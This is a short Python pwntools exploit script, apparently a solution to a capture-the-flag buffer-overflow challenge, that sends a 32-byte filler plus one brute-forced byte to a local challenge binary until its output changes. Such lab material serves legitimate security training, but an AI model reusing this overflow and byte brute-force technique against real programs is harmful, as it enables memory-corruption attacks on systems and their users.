import hashlib
from pwn import *

context.log_level = 'debug'
context.os = 'linux'
context.arch = 'amd64'

for i in range(256):
    payload = b'12345678901234567890123456789012' + p8(i)
    io = process('/challenge/buffer-overflow-level3.0')
    io.sendafter("Give me your input:\n", payload)
    if len(io.recv()) > 9:
        break
    io.close()

while True:
    io.recvline()